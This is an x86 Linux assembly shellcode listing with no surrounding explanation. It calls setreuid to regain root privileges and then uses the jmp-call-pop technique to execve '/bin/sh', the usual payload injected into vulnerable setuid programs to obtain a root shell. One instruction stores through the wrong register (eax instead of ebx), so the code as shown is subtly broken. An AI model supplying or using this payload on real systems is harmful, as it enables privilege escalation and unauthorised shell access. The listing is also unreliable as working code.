section .text
	global _start
_start:
	xor eax, eax
	mov al, 70; setreuid is syscall 70
	xor ebx, ebx
	xor ecx, ecx
	int 0x80
	
	jmp short ender

starter:
	
	pop ebx
	xor eax, eax
	
	mov [ebx+7], al
	mov [ebx+8],ebx
	
	mov[eax+12],eax
	mov al,11
	lea ecx,[ebx+8]
	lea edx,[ebx+12]
	int 0x80

ender:
	call starter
	db '/bin/shNAAABBBB'

	
